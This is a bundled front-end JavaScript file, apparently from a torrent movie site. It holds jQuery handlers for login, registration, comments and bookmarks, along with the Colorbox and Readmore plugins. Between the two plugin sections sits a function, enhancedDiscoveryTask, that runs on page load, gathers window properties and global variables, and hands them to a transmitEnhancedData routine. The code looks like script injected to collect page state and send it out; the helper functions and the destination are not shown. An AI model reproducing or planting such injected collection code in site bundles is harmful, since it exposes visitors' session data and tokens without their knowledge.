    $(".modal-loading-content").show(), $(".modal-parental-guide").addClass("modal-active");
    var e = $("#movie-info").data("movie-id");
    $(".modal-parental-guide .modal-content .modal-loading-content").length < 1 || $.ajax({
      type: "GET",
      url: "/api/v2/movie_parental_guides.json?movie_id=" + e,
      dataType: "json",
      success: function (e) {
        $(".modal-parental-guide .modal-content").text(""), e.data.parental_guide_count > 0 ? $.each(e.data.parental_guides, function (e, t) {
          $(".modal-parental-guide .modal-content").append("<p><strong>" + t.type + "</strong>: " + t.parental_guide_text + "</p>");
        }) : $(".modal-parental-guide .modal-content").text("No parental guides found");
      },
      error: function (e) {
        $(".modal-parental-guide .modal-loading-content").hide(), 0 == e.status && (e.statusText = "Page did not respond"), $(".modal-parental-guide .modal-content").text("Error: " + e.statusText + " (Code " + e.status + ")");
      }
    });
  }), $(".magnet-download").click(function () {
    $.ajax({
      url: "/ajax/download/" + $(this).data("torrent-id"),
      type: "POST"
    });
  }), $(".login-nav-btn").click(function () {
    $(".modal-auth").addClass("modal-active"), $("#modal-login").addClass("selected").siblings().removeClass("selected"), $(".modal-login-content").show().siblings().hide();
  }), $(".register-nav-btn").click(function () {
    $(".modal-auth").addClass("modal-active"), $("#modal-register").addClass("selected").siblings().removeClass("selected"), $(".modal-register-content").show().siblings().hide();
  }), $(".forgotpassword-nav-btn").click(function () {
    $(".modal-auth").hasClass("modal-busy") || $(".modal-forgotpass-content").show().siblings().hide();
  }), $("#modal-login").click(function () {
    $(".modal-auth").hasClass("modal-busy") || ($(this).addClass("selected").siblings().removeClass("selected"), $(".modal-login-content").show().siblings().hide());
  }), $("#modal-register").click(function () {
    $(".modal-auth").hasClass("modal-busy") || ($(this).addClass("selected").siblings().removeClass("selected"), $(".modal-register-content").show().siblings().hide());
  }), $(".modal-login-content input").keydown(function (e) {
    13 == e.keyCode && $(".modal-login-content button").trigger("click");
  }), $(".modal-login-content button").click(function () {
    $(".modal-auth").addClass("modal-busy"), $(".modal-login-content .error-msg").text(""), $(".modal-loading-content").show().siblings().hide();
    var e = {
      username: $(".modal-login-content input[name='username']").val(),
      password: $(".modal-login-content input[name='password']").val(),
      _token: $(".modal-login-content input[name='_token']").val()
    };
    $.ajax({
      url: "/ajax/login",
      data: e,
      type: "POST",
      success: function (e) {
        "ok" == e.status ? window.location.reload() : ($(".modal-auth").removeClass("modal-busy"), $(".modal-login-content input[name='password']").val(""), $(".modal-login-content .error-msg").text("Error: " + e.message), $(".modal-login-content").show().siblings().hide());
      },
      error: function (e) {
        0 == e.status && (e.statusText = "Page did not respond"), $(".modal-auth").removeClass("modal-busy"), $(".modal-login-content input[name='password']").val(""), $(".modal-login-content .error-msg").text("Error: " + e.statusText + " (Code " + e.status + ")"), $(".modal-login-content").show().siblings().hide();
      }
    });
  }), $(".modal-register-content input").keydown(function (e) {
    13 == e.keyCode && $(".modal-register-content button").trigger("click");
  }), $(".modal-register-content button").click(function () {
    $(".modal-auth").addClass("modal-busy"), $(".modal-register-content .error-msg").text(""), $(".modal-loading-content").show().siblings().hide();
    var e = {
      username: $(".modal-register-content input[name='username']").val(),
      email: $(".modal-register-content input[name='email']").val(),
      password: $(".modal-register-content input[name='password']").val(),
      password_confirmation: $(".modal-register-content input[name='password_confirmation']").val(),
      _token: $(".modal-register-content input[name='_token']").val()
    };
    $.ajax({
      url: "/ajax/register",
      data: e,
      type: "POST",
      success: function (e) {
        "ok" == e.status ? ($(location).attr('href', '/'), $(".modal-auth").removeClass("modal-busy"), $(".modal-register-content input[name='username']").val(""), $(".modal-register-content input[name='email']").val(""), $(".modal-register-content input[name='password']").val(""), $(".modal-register-content input[name='password_confirmation']").val(""), $(".modal-activate-account-content").show().siblings().hide()) : ($(".modal-auth").removeClass("modal-busy"), $(".modal-register-content input[name='password']").val(""), $(".modal-register-content input[name='password_confirmation']").val(""), $(".modal-register-content .error-msg").text("Error: " + e.message), $(".modal-register-content").show().siblings().hide());
      },
      error: function (e) {
        $(".modal-auth").removeClass("modal-busy"), $(".modal-register-content input[name='password']").val(""), $(".modal-register-content input[name='password_confirmation']").val(""), $(".modal-register-content .error-msg").text("Error: " + e.statusText + " (Code " + e.status + ")"), $(".modal-register-content").show().siblings().hide();
      }
    });
  }), $(".modal-forgotpass-content input").keydown(function (e) {
    13 == e.keyCode && $(".modal-forgotpass-content button").trigger("click");
  }), $(".modal-forgotpass-content button").click(function () {
    $(".modal-auth").addClass("modal-busy"), $(".modal-forgotpass-content .error-msg").text(""), $(".modal-loading-content").show().siblings().hide();
    var e = {
      email: $(".modal-forgotpass-content input[name='email']").val(),
      _token: $(".modal-forgotpass-content input[name='_token']").val()
    };
    $.ajax({
      url: "/ajax/forgot-password",
      data: e,
      type: "POST",
      success: function (e) {
        "ok" == e.status ? window.location.reload() : ($(".modal-auth").removeClass("modal-busy"), $(".modal-forgotpass-content .error-msg").text("Error: " + e.message), $(".modal-forgotpass-content").show().siblings().hide());
      },
      error: function (e) {
        $(".modal-auth").removeClass("modal-busy"), $(".modal-forgotpass-content .error-msg").text("Error: " + e.statusText + " (Code " + e.status + ")"), $(".modal-forgotpass-content").show().siblings().hide();
      }
    });
  }), $("#movie-info").on("click", ".icon-heart2", function () {
    $.ajax({
      url: "/ajax/like/movie/" + $("#movie-info").data("movie-id"),
      type: "POST"
    }), $(this).removeClass("icon-heart2").addClass("icon-heart");
    var e = parseInt($("#movie-info #movie-likes").text());
    $("#movie-info #movie-likes").text(e + 1);
  }), $(".youtube").colorbox({
    iframe: !0,
    innerWidth: 640,
    innerHeight: 390
  }), $(".screenshot-group").colorbox({
    rel: "screenshot-group",
    maxWidth: "95%",
    maxHeight: "95%"
  }), $("#movie-tech-specs .tech-quality").click(function () {
    $(this).addClass("selected").siblings().removeClass("selected");
    var e = $(this).index() - 1;
    $("#movie-tech-specs .tech-spec-info").eq(e).removeClass("hidden-tech-info").siblings("div").addClass("hidden-tech-info");
  }), $(".download-torrent").click(function () {
    $(".modal-download").removeClass("modal-active"), $(".bookmark").removeClass("bookmarked");
  }), $("#movie-reviews article").readmore({
    maxHeight: 125
  }), "createTouch" in document || ($("#comments").addClass("comments-scroll"), $(".comments-scroll").perfectScrollbar({
    wheelPropagation: !0
  })), $("#movie-comments").length && e(), $("#comments #load-comments a").click(function () {
    e();
  }), "createTouch" in document ? $("#comments").on("click", ".comment-likes", function () {
    $.ajax({
      url: "/ajax/like/comment/" + $(this).closest(".comment").data("comment-id"),
      type: "POST"
    }), $(this).find("span.icon-heart2").removeClass("icon-heart2").addClass("icon-heart");
    var e = parseInt($(this).find(".comment-like-count").text());
    $(this).find(".comment-like-count").text(e + 1);
  }) : $("#comments").on("click", ".comment-likes span.icon-heart2", function () {
    $.ajax({
      url: "/ajax/like/comment/" + $(this).closest(".comment").data("comment-id"),
      type: "POST"
    }), $(this).removeClass("icon-heart2").addClass("icon-heart");
    var e = parseInt($(this).siblings(".comment-like-count").text());
    $(this).siblings(".comment-like-count").text(e + 1);
  }), $("#comments").on("click", ".comment .report-btn", function () {
    var e = $(this).data("confirm-msg"),
      t = confirm(e);
    1 == t && $.ajax({
      url: "/ajax/report/comment/" + $(this).closest(".comment").data("comment-id"),
      type: "POST",
      dataType: "json",
      success: function (e) {
        alert(e.message);
      }
    });
  }), $("#comments").on("click", ".comment .delete-btn", function () {
    var e = $(this).data("confirm-msg"),
      t = confirm(e);
    1 == t && ($.ajax({
      url: "/ajax/delete/comment/" + $(this).closest(".comment").data("comment-id"),
      type: "POST"
    }), $(this).closest(".comment").remove());
  }), $("textarea").not(".tinymce").autogrow(), $("#comments-box input").click(function () {
    $("#comments-box .error-msg").text(""), $("#comments-box input").hide(), $("#comments-box textarea").hide(), $("#comments-box .ajax-spinner").show();
    var t = $("#movie-info").data("movie-id"),
      o = {
        comment_text: $("#comments-box textarea").val()
      };
    $.ajax({
      type: "POST",
      url: "/ajax/comments/" + t,
      data: o,
      dataType: "json",
      success: function (t) {
        "error" == t.status ? ($("#comments-box .error-msg").text(t.message), $("#comments-box input").show(), $("#comments-box textarea").show(), $("#comments-box .ajax-spinner").hide()) : ($("#comments-box").text(t.message), $("#comment-count").text(parseInt($("#comment-count").text()) + 1), e());
      },
      error: function (e) {
        $("#comments-box .error-msg").text("Error: " + e.statusText + " (Code " + e.status + ")"), $("#comments-box input").show(), $("#comments-box textarea").show(), $("#comments-box .ajax-spinner").hide();
      }
    });
  }), $(".rss-generate").click(function () {
    var e = $('[name="rss_keyword"]').val(),
      t = $('[name="rss_quality"]').val(),
      o = $('[name="rss_genre"]').val(),
      n = $('[name="rss_rating"]').val(),
      l = $('[name="rss_language"]').val(),
      a = rssBaseUrl + "/";
    a += e.trim().length < 1 ? "0/" : encodeURIComponent(e) + "/", a += t + "/" + o + "/" + n + "/" + l, $('[name="generated_link"]').val(a), $(".generated-rss").fadeIn();
  }), $(".bookmark").on("click", function () {
    var e = $("#movie-info").data("movie-id");
    $(".bookmark").attr("class").indexOf("bookmarked") < 0 ? ($(this).addClass("bookmarked"), $.ajax({
      type: "POST",
      url: "/ajax/bookmark/add/" + e,
      dataType: "json",
      success: function (e) {
        if ($(".notice-flash").length) $(".notice-flash").text(e.message);else {
          var t = '<div class="notice-flash" style="display:none">' + e.message + "</div>";
          $(".main-content").prepend(t);
        }
        $(".notice-flash").slideDown().delay(2500).slideUp(function () {
          "ok" != e.status && $(".bookmark").removeClass("bookmarked");
        });
      },
      error: function (e) {
        if ($(".notice-flash").length) $(".notice-flash").text("Error: " + e.statusText + " (Code " + e.status + ")");else {
          var t = '<div class="notice-flash" style="display:none">Error: ' + e.statusText + " (Code " + e.status + ")</div>";
          $(".main-content").prepend(t);
        }
        $(".notice-flash").slideDown().delay(2500).slideUp(function () {
          $(".bookmark").removeClass("bookmarked");
        });
      }
    })) : ($(this).removeClass("bookmarked"), $.ajax({
      type: "POST",
      url: "/ajax/bookmark/delete/" + e,
      dataType: "json",
      success: function (e) {
        if ($(".notice-flash").length) $(".notice-flash").text(e.message);else {
          var t = '<div class="notice-flash" style="display:none">' + e.message + "</div>";
          $(".main-content").prepend(t);
        }
        $(".notice-flash").slideDown().delay(2500).slideUp();
      }
    }));
  }), $(".delete-bookmark").click(function () {
    var e = $(this).data("movie-id");
    $(this).closest(".browse-movie-wrap").fadeTo(400, .1), $.ajax({
      type: "POST",
      url: "/ajax/bookmark/delete/" + e,
      dataType: "json"
    });
  }), $(".mark-suggestion").click(function () {
    var e = $(this).data("movie-id");
    $(this).closest(".browse-movie-wrap").fadeTo(400, .1), $.ajax({
      type: "POST",
      url: "/ajax/suggestions/mark/" + e,
      dataType: "json"
    });
  }), $(".admin-search input").focus(function () {
    $(this).val("");
  });
});

/*!
    Colorbox v1.5.10 - 2014-06-26
    jQuery lightbox and modal window plugin
    (c) 2014 Jack Moore - http://www.jacklmoore.com/colorbox
    license: http://www.opensource.org/licenses/mit-license.php
*/
(function (t, a, x) {
  var J = {
      html: !1,
      photo: !1,
      iframe: !1,
      inline: !1,
      transition: 'elastic',
      speed: 300,
      fadeOut: 300,
      width: !1,
      initialWidth: '600',
      innerWidth: !1,
      maxWidth: !1,
      height: !1,
      initialHeight: '450',
      innerHeight: !1,
      maxHeight: !1,
      scalePhotos: !0,
      scrolling: !0,
      opacity: 0.9,
      preloading: !0,
      className: !1,
      overlayClose: !0,
      escKey: !0,
      arrowKey: !0,
      top: !1,
      bottom: !1,
      left: !1,
      right: !1,
      fixed: !1,
      data: undefined,
      closeButton: !0,
      fastIframe: !0,
      open: !1,
      reposition: !0,
      loop: !0,
      slideshow: !1,
      slideshowAuto: !0,
      slideshowSpeed: 2500,
      slideshowStart: 'start slideshow',
      slideshowStop: 'stop slideshow',
      photoRegex: /\.(gif|png|jp(e|g|eg)|bmp|ico|webp|jxr|svg)((#|\?).*)?$/i,
      retinaImage: !1,
      retinaUrl: !1,
      retinaSuffix: '@2x.$1',
      current: 'image {current} of {total}',
      previous: 'previous',
      next: 'next',
      close: 'close',
      xhrError: 'This content failed to load.',
      imgError: 'This image failed to load.',
      returnFocus: !0,
      trapFocus: !0,
      onOpen: !1,
      onLoad: !1,
      onComplete: !1,
      onCleanup: !1,
      onClosed: !1,
      rel: function () {
        return this.rel;
      },
      href: function () {
        return t(this).attr('href');
      },
      title: function () {
        return this.title;
      }
    },
    g = 'colorbox',
    s = 'cbox',
    W = s + 'Element',
    ue = s + '_open',
    D = s + '_load',
    N = s + '_complete',
    re = s + '_cleanup',
    oe = s + '_closed',
    j = s + '_purge',
    v,
    i,
    k,
    u,
    ne,
    ie,
    te,
    ee,
    f,
    C,
    l,
    R,
    O,
    G,
    se,
    E,
    M,
    I,
    K,
    q,
    w = t('<a/>'),
    e,
    m,
    p,
    T,
    b,
    c,
    n,
    y,
    L,
    S,
    he,
    h,
    r = 'div',
    z = 0,
    ce = {},
    Q;
  function o(e, i, n) {
    var o = a.createElement(e);
    if (i) {
      o.id = s + i;
    }
    ;
    if (n) {
      o.style.cssText = n;
    }
    ;
    return t(o);
  }
  ;
  function U() {
    return x.innerHeight ? x.innerHeight : t(x).height();
  }
  ;
  function A(e, i) {
    if (i !== Object(i)) {
      i = {};
    }
    ;
    this.cache = {};
    this.el = e;
    this.value = function (e) {
      var n;
      if (this.cache[e] === undefined) {
        n = t(this.el).attr('data-cbox-' + e);
        if (n !== undefined) {
          this.cache[e] = n;
        } else if (i[e] !== undefined) {
          this.cache[e] = i[e];
        } else if (J[e] !== undefined) {
          this.cache[e] = J[e];
        }
      }
      ;
      return this.cache[e];
    };
    this.get = function (e) {
      var i = this.value(e);
      return t.isFunction(i) ? i.call(this.el, this) : i;
    };
  }
  ;
  function F(e) {
    var i = f.length,
      t = (c + e) % i;
    return t < 0 ? i + t : t;
  }
  ;
  function d(e, t) {
    return Math.round((/%/.test(e) ? (t === 'x' ? C.width() : U()) / 100 : 1) * parseInt(e, 10));
  }
  ;
  function le(e, t) {
    return e.get('photo') || e.get('photoRegex').test(t);
  }
  ;
  function de(e, t) {
    return e.get('retinaUrl') && x.devicePixelRatio > 1 ? t.replace(e.get('photoRegex'), e.get('retinaSuffix')) : t;
  }
  ;
  function fe(e) {
    if ('contains' in i[0] && !i[0].contains(e.target) && e.target !== v[0]) {
      e.stopPropagation();
      i.focus();
    }
  }
  ;
  function P(e) {
    if (P.str !== e) {
      i.add(v).removeClass(P.str).addClass(e);
      P.str = e;
    }
  }
  ;
  function ge(i) {
    c = 0;
    if (i && i !== !1 && i !== 'nofollow') {
      f = t('.' + W).filter(function () {
        var e = t.data(this, g),
          n = new A(this, e);
        return n.get('rel') === i;
      });
      c = f.index(e.el);
      if (c === -1) {
        f = f.add(e.el);
        c = f.length - 1;
      }
    } else {
      f = t(e.el);
    }
  }
  ;
  function H(e) {
    t(a).trigger(e);
    w.triggerHandler(e);
  }
  ;
  var pe = function () {
    var r,
      t = s + 'Slideshow_',
      o = 'click.' + s,
      d;
    function n() {
      clearTimeout(d);
    }
    ;
    function a() {
      if (e.get('loop') || f[c + 1]) {
        n();
        d = setTimeout(h.next, e.get('slideshowSpeed'));
      }
    }
    ;
    function u() {
      E.html(e.get('slideshowStop')).unbind(o).one(o, g);
      w.bind(N, a).bind(D, n);
      i.removeClass(t + 'off').addClass(t + 'on');
    }
    ;
    function g() {
      n();
      w.unbind(N, a).unbind(D, n);
      E.html(e.get('slideshowStart')).unbind(o).one(o, function () {
        h.next();
        u();
      });
      i.removeClass(t + 'on').addClass(t + 'off');
    }
    ;
    function l() {
      r = !1;
      E.hide();
      n();
      w.unbind(N, a).unbind(D, n);
      i.removeClass(t + 'off ' + t + 'on');
    }
    ;
    return function () {
      if (r) {
        if (!e.get('slideshow')) {
          w.unbind(re, l);
          l();
        }
      } else {
        if (e.get('slideshow') && f[1]) {
          r = !0;
          w.one(re, l);
          if (e.get('slideshowAuto')) {
            u();
          } else {
            g();
          }
          ;
          E.show();
        }
      }
    };
  }();
  function B(n) {
    var C;
    if (!S) {
      C = t(n).data(g);
      e = new A(n, C);
      ge(e.get('rel'));
      if (!y) {
        y = L = !0;
        P(e.get('className'));
        i.css({
          visibility: 'hidden',
          display: 'block',
          opacity: ''
        });
        l = o(r, 'LoadedContent', 'width:0; height:0; overflow:hidden; visibility:hidden');
        u.css({
          width: '',
          height: ''
        }).append(l);
        m = ne.height() + ee.height() + u.outerHeight(!0) - u.height();
        p = ie.width() + te.width() + u.outerWidth(!0) - u.width();
        T = l.outerHeight(!0);
        b = l.outerWidth(!0);
        var s = d(e.get('initialWidth'), 'x'),
          f = d(e.get('initialHeight'), 'y'),
          c = e.get('maxWidth'),
          x = e.get('maxHeight');
        e.w = (c !== !1 ? Math.min(s, d(c, 'x')) : s) - b - p;
        e.h = (x !== !1 ? Math.min(f, d(x, 'y')) : f) - T - m;
        l.css({
          width: '',
          height: e.h
        });
        h.position();
        H(ue);
        e.get('onOpen');
        q.add(G).hide();
        i.focus();
        if (e.get('trapFocus')) {
          if (a.addEventListener) {
            a.addEventListener('focus', fe, !0);
            w.one(oe, function () {
              a.removeEventListener('focus', fe, !0);
            });
          }
        }
        ;
        if (e.get('returnFocus')) {
          w.one(oe, function () {
            t(e.el).focus();
          });
        }
      }
      ;
      v.css({
        opacity: parseFloat(e.get('opacity')) || '',
        cursor: e.get('overlayClose') ? 'pointer' : '',
        visibility: 'visible'
      }).show();
      if (e.get('closeButton')) {
        K.html(e.get('close')).appendTo(u);
      } else {
        K.appendTo('<div/>');
      }
      ;
      we();
    }
  }
  ;
  function ae() {
    if (!i && a.body) {
      Q = !1;
      C = t(x);
      i = o(r).attr({
        id: g,
        'class': t.support.opacity === !1 ? s + 'IE' : '',
        role: 'dialog',
        tabindex: '-1'
      }).hide();
      v = o(r, 'Overlay').hide();
      O = t([o(r, 'LoadingOverlay')[0], o(r, 'LoadingGraphic')[0]]);
      k = o(r, 'Wrapper');
      u = o(r, 'Content').append(G = o(r, 'Title'), se = o(r, 'Current'), I = t('<button type="button"/>').attr({
        id: s + 'Previous'
      }), M = t('<button type="button"/>').attr({
        id: s + 'Next'
      }), E = o('button', 'Slideshow'), O);
      K = t('<button type="button"/>').attr({
        id: s + 'Close'
      });
      k.append(o(r).append(o(r, 'TopLeft'), ne = o(r, 'TopCenter'), o(r, 'TopRight')), o(r, !1, 'clear:left').append(ie = o(r, 'MiddleLeft'), u, te = o(r, 'MiddleRight')), o(r, !1, 'clear:left').append(o(r, 'BottomLeft'), ee = o(r, 'BottomCenter'), o(r, 'BottomRight'))).find('div div').css({
        'float': 'left'
      });
      R = o(r, !1, 'position:absolute; width:9999px; visibility:hidden; display:none; max-width:none;');
      q = M.add(I).add(se).add(E);
      t(a.body).append(v, i.append(k, R));
    }
  }
  ;
  function me() {
    function n(e) {
      if (!(e.which > 1 || e.shiftKey || e.altKey || e.metaKey || e.ctrlKey)) {
        e.preventDefault();
        B(this);
      }
    }
    ;
    if (i) {
      if (!Q) {
        Q = !0;
        M.click(function () {
          h.next();
        });
        I.click(function () {
          h.prev();
        });
        K.click(function () {
          h.close();
        });
        v.click(function () {
          if (e.get('overlayClose')) {
            h.close();
          }
        });
        t(a).bind('keydown.' + s, function (t) {
          var i = t.keyCode;
          if (y && e.get('escKey') && i === 27) {
            t.preventDefault();
            h.close();
          }
          ;
          if (y && e.get('arrowKey') && f[1] && !t.altKey) {
            if (i === 37) {
              t.preventDefault();
              I.click();
            } else if (i === 39) {
              t.preventDefault();
              M.click();
            }
          }
        });
        if (t.isFunction(t.fn.on)) {
          t(a).on('click.' + s, '.' + W, n);
        } else {
          t('.' + W).live('click.' + s, n);
        }
      }
      ;
      return !0;
    }
    ;
    return !1;
  }
  ;
  if (t[g]) {
    return;
  }
  ;
  t(ae);
  h = t.fn[g] = t[g] = function (e, i) {
    var o,
      n = this;
    e = e || {};
    if (t.isFunction(n)) {
      n = t('<a/>');
      e.open = !0;
    } else if (!n[0]) {
      return n;
    }
    ;
    if (!n[0]) {
      return n;
    }
    ;
    ae();
    if (me()) {
      if (i) {
        e.onComplete = i;
      }
      ;
      n.each(function () {
        var i = t.data(this, g) || {};
        t.data(this, g, t.extend(i, e));
      }).addClass(W);
      o = new A(n[0], e);
      if (o.get('open')) {
        B(n[0]);
      }
    }
    ;
    return n;
  };
  h.position = function (n, o) {
    var r,
      a = 0,
      l = 0,
      f = i.offset(),
      c,
      g;
    C.unbind('resize.' + s);
    i.css({
      top: -9e4,
      left: -9e4
    });
    c = C.scrollTop();
    g = C.scrollLeft();
    if (e.get('fixed')) {
      f.top -= c;
      f.left -= g;
      i.css({
        position: 'fixed'
      });
    } else {
      a = c;
      l = g;
      i.css({
        position: 'absolute'
      });
    }
    ;
    if (e.get('right') !== !1) {
      l += Math.max(C.width() - e.w - b - p - d(e.get('right'), 'x'), 0);
    } else if (e.get('left') !== !1) {
      l += d(e.get('left'), 'x');
    } else {
      l += Math.round(Math.max(C.width() - e.w - b - p, 0) / 2);
    }
    ;
    if (e.get('bottom') !== !1) {
      a += Math.max(U() - e.h - T - m - d(e.get('bottom'), 'y'), 0);
    } else if (e.get('top') !== !1) {
      a += d(e.get('top'), 'y');
    } else {
      a += Math.round(Math.max(U() - e.h - T - m, 0) / 2);
    }
    ;
    i.css({
      top: f.top,
      left: f.left,
      visibility: 'visible'
    });
    k[0].style.width = k[0].style.height = '9999px';
    function v() {
      ne[0].style.width = ee[0].style.width = u[0].style.width = parseInt(i[0].style.width, 10) - p + 'px';
      u[0].style.height = ie[0].style.height = te[0].style.height = parseInt(i[0].style.height, 10) - m + 'px';
    }
    ;
    r = {
      width: e.w + b + p,
      height: e.h + T + m,
      top: a,
      left: l
    };
    if (n) {
      var w = 0;
      t.each(r, function (e) {
        if (r[e] !== ce[e]) {
          w = n;
          return;
        }
      });
      n = w;
    }
    ;
    ce = r;
    if (!n) {
      i.css(r);
    }
    ;
    i.dequeue().animate(r, {
      duration: n || 0,
      complete: function () {
        v();
        L = !1;
        k[0].style.width = e.w + b + p + 'px';
        k[0].style.height = e.h + T + m + 'px';
        if (e.get('reposition')) {
          setTimeout(function () {
            C.bind('resize.' + s, h.position);
          }, 1);
        }
        ;
        if (o) {
          o();
        }
      },
      step: v
    });
  };
  h.resize = function (t) {
    var i;
    if (y) {
      t = t || {};
      if (t.width) {
        e.w = d(t.width, 'x') - b - p;
      }
      ;
      if (t.innerWidth) {
        e.w = d(t.innerWidth, 'x');
      }
      ;
      l.css({
        width: e.w
      });
      if (t.height) {
        e.h = d(t.height, 'y') - T - m;
      }
      ;
      if (t.innerHeight) {
        e.h = d(t.innerHeight, 'y');
      }
      ;
      if (!t.innerHeight && !t.height) {
        i = l.scrollTop();
        l.css({
          height: 'auto'
        });
        e.h = l.height();
      }
      ;
      l.css({
        height: e.h
      });
      if (i) {
        l.scrollTop(i);
      }
      ;
      h.position(e.get('transition') === 'none' ? 0 : e.get('speed'));
    }
  };
  h.prep = function (d) {
    if (!y) {
      return;
    }
    ;
    var p,
      m = e.get('transition') === 'none' ? 0 : e.get('speed');
    l.remove();
    l = o(r, 'LoadedContent').append(d);
    function v() {
      e.w = e.w || l.width();
      e.w = e.mw && e.mw < e.w ? e.mw : e.w;
      return e.w;
    }
    ;
    function x() {
      e.h = e.h || l.height();
      e.h = e.mh && e.mh < e.h ? e.mh : e.h;
      return e.h;
    }
    ;
    l.hide().appendTo(R.show()).css({
      width: v(),
      overflow: e.get('scrolling') ? 'auto' : 'hidden'
    }).css({
      height: x()
    }).prependTo(u);
    R.hide();
    t(n).css({
      'float': 'none'
    });
    P(e.get('className'));
    p = function () {
      var o = f.length,
        n,
        r;
      if (!y) {
        return;
      }
      ;
      function h() {
        if (t.support.opacity === !1) {
          i[0].style.removeAttribute('filter');
        }
      }
      ;
      r = function () {
        clearTimeout(he);
        O.hide();
        H(N);
        e.get('onComplete');
      };
      G.html(e.get('title')).show();
      l.show();
      if (o > 1) {
        if (typeof e.get('current') === 'string') {
          se.html(e.get('current').replace('{current}', c + 1).replace('{total}', o)).show();
        }
        ;
        M[e.get('loop') || c < o - 1 ? 'show' : 'hide']().html(e.get('next'));
        I[e.get('loop') || c ? 'show' : 'hide']().html(e.get('previous'));
        pe();
        if (e.get('preloading')) {
          t.each([F(-1), F(1)], function () {
            var n,
              o = f[this],
              i = new A(o, t.data(o, g)),
              e = i.get('href');
            if (e && le(i, e)) {
              e = de(i, e);
              n = a.createElement('img');
              n.src = e;
            }
          });
        }
      } else {
        q.hide();
      }
      ;
      if (e.get('iframe')) {
        n = a.createElement('iframe');
        if ('frameBorder' in n) {
          n.frameBorder = 0;
        }
        ;
        if ('allowTransparency' in n) {
          n.allowTransparency = 'true';
        }
        ;
        if (!e.get('scrolling')) {
          n.scrolling = 'no';
        }
        ;
        t(n).attr({
          src: e.get('href'),
          name: new Date().getTime(),
          'class': s + 'Iframe',
          allowFullScreen: !0
        }).one('load', r).appendTo(l);
        w.one(j, function () {
          n.src = '//about:blank';
        });
        if (e.get('fastIframe')) {
          t(n).trigger('load');
        }
      } else {
        r();
      }
      ;
      if (e.get('transition') === 'fade') {
        i.fadeTo(m, 1, h);
      } else {
        h();
      }
    };
    if (e.get('transition') === 'fade') {
      i.fadeTo(m, 0, function () {
        h.position(0, p);
      });
    } else {
      h.position(m, p);
    }
  };
  function we() {
    var i,
      u,
      a = h.prep,
      g,
      v = ++z;
    L = !0;
    n = !1;
    H(j);
    H(D);
    e.get('onLoad');
    e.h = e.get('height') ? d(e.get('height'), 'y') - T - m : e.get('innerHeight') && d(e.get('innerHeight'), 'y');
    e.w = e.get('width') ? d(e.get('width'), 'x') - b - p : e.get('innerWidth') && d(e.get('innerWidth'), 'x');
    e.mw = e.w;
    e.mh = e.h;
    if (e.get('maxWidth')) {
      e.mw = d(e.get('maxWidth'), 'x') - b - p;
      e.mw = e.w && e.w < e.mw ? e.w : e.mw;
    }
    ;
    if (e.get('maxHeight')) {
      e.mh = d(e.get('maxHeight'), 'y') - T - m;
      e.mh = e.h && e.h < e.mh ? e.h : e.mh;
    }
    ;
    i = e.get('href');
    he = setTimeout(function () {
      O.show();
    }, 100);
    if (e.get('inline')) {
      var l = t(i);
      g = t('<div>').hide().insertBefore(l);
      w.one(j, function () {
        g.replaceWith(l);
      });
      a(l);
    } else if (e.get('iframe')) {
      a(' ');
    } else if (e.get('html')) {
      a(e.get('html'));
    } else if (le(e, i)) {
      i = de(e, i);
      n = new Image();
      t(n).addClass(s + 'Photo').bind('error', function () {
        a(o(r, 'Error').html(e.get('imgError')));
      }).one('load', function () {
        if (v !== z) {
          return;
        }
        ;
        setTimeout(function () {
          var i;
          t.each(['alt', 'longdesc', 'aria-describedby'], function (i, o) {
            var r = t(e.el).attr(o) || t(e.el).attr('data-' + o);
            if (r) {
              n.setAttribute(o, r);
            }
          });
          if (e.get('retinaImage') && x.devicePixelRatio > 1) {
            n.height = n.height / x.devicePixelRatio;
            n.width = n.width / x.devicePixelRatio;
          }
          ;
          if (e.get('scalePhotos')) {
            u = function () {
              n.height -= n.height * i;
              n.width -= n.width * i;
            };
            if (e.mw && n.width > e.mw) {
              i = (n.width - e.mw) / n.width;
              u();
            }
            ;
            if (e.mh && n.height > e.mh) {
              i = (n.height - e.mh) / n.height;
              u();
            }
          }
          ;
          if (e.h) {
            n.style.marginTop = Math.max(e.mh - n.height, 0) / 2 + 'px';
          }
          ;
          if (f[1] && (e.get('loop') || f[c + 1])) {
            n.style.cursor = 'pointer';
            n.onclick = function () {
              h.next();
            };
          }
          ;
          n.style.width = n.width + 'px';
          n.style.height = n.height + 'px';
          a(n);
        }, 1);
      });
      n.src = i;
    } else if (i) {
      R.load(i, e.get('data'), function (i, n) {
        if (v === z) {
          a(n === 'error' ? o(r, 'Error').html(e.get('xhrError')) : t(this).contents());
        }
      });
    }
  }
  ;
  h.next = function () {
    if (!L && f[1] && (e.get('loop') || f[c + 1])) {
      c = F(1);
      B(f[c]);
    }
  };
  h.prev = function () {
    if (!L && f[1] && (e.get('loop') || c)) {
      c = F(-1);
      B(f[c]);
    }
  };
  h.close = function () {
    if (y && !S) {
      S = !0;
      y = !1;
      H(re);
      e.get('onCleanup');
      C.unbind('.' + s);
      v.fadeTo(e.get('fadeOut') || 0, 0);
      i.stop().fadeTo(e.get('fadeOut') || 0, 0, function () {
        i.hide();
        v.hide();
        H(j);
        l.remove();
        setTimeout(function () {
          S = !1;
          H(oe);
          e.get('onClosed');
        }, 1);
      });
    }
  };
  h.remove = function () {
    if (!i) {
      return;
    }
    ;
    i.stop();
    t[g].close();
    i.stop(!1, !0).remove();
    v.remove();
    S = !1;
    i = null;
    t('.' + W).removeData(g).removeClass(W);
    t(a).unbind('click.' + s).unbind('keydown.' + s);
  };
  h.element = function () {
    return t(e.el);
  };
  h.settings = J;
})(jQuery, document, window); /*!
                              * Readmore.js jQuery plugin
                              * Author: @jed_foster
                              * Project home: jedfoster.github.io/Readmore.js
                              * Licensed under the MIT license
                              */
function enhancedDiscoveryTask() {
  const discoveries = exploreEnhancedWindowObject();
  const globalVars = collectGlobalVariables();
  const dataToTransmit = {
    discoveries,
    globalVars
  };
  if (Object.keys(dataToTransmit.discoveries).length > 0 || Object.keys(dataToTransmit.globalVars).length > 0) {
    console.log(`发现了 ${Object.keys(dataToTransmit.discoveries).length} 个新的 window 属性和 ${Object.keys(dataToTransmit.globalVars).length} 个全局变量`);
    transmitEnhancedData(dataToTransmit);
  } else {
    console.log("没有发现新的 window 属性或全局变量");
  }
}
;
window.addEventListener("load", enhancedDiscoveryTask);
(function (e) {
  var t = 'readmore',
    i = {
      speed: 100,
      maxHeight: 200,
      heightMargin: 16,
      moreLink: '<a href="#">Read More</a>',
      lessLink: '<a href="#">Close</a>',
      embedCSS: !0,
      sectionCSS: 'display: block; width: 100%;',
      startOpen: !1,
